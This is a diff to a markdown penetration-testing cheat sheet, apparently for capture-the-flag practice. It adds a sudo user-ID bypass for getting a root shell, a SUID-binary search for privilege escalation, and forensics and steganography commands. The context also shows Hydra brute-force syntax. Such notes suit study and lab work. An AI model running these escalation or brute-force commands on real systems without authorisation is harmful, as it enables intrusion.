@@ -285,12 +285,19 @@ Python Server
 Search and download Linenum.sh and Linpeas.sh for Linux.
 Winpeas for windows.
 
+sudo -u#-1 /bin/bash
+
+>if **(ALL, !root) /bin/bash** in sudo -l
+
 sudo -l 
 
 >for list sudo files not required to use root
 >
 >for list a c script, bash or other script, can overwrite it with BIN/BASH for scalation
->
+
+find / -perm -u=s -type f 2>/dev/null
+
+>SUID privillege scalation -> https://gtfobins.github.io
 
 ##  BRUTE FORCE
 
@@ -309,6 +316,26 @@ Hydra -v -t10 -l [LOGIN] -P [WORDLIST] [URL] -s [PORT]
 >-P pass wordlist
 
 ## Cryptography
+
+### FORENSE
+
+exiftool [IMAGE]
+
+>Show metadata from image
+
+xxd [FILE]
+
+>Show binaries from file
+
+binwalk [FILE]
+
+>Search messages in Binaries from file
+
+steghide extract -sf [IMAGE]
+
+>Extract messages from IMAGE STENOGRAFY
+
+zip2john [FILE] > [OUTPUT]
 
 ### HASHES
 
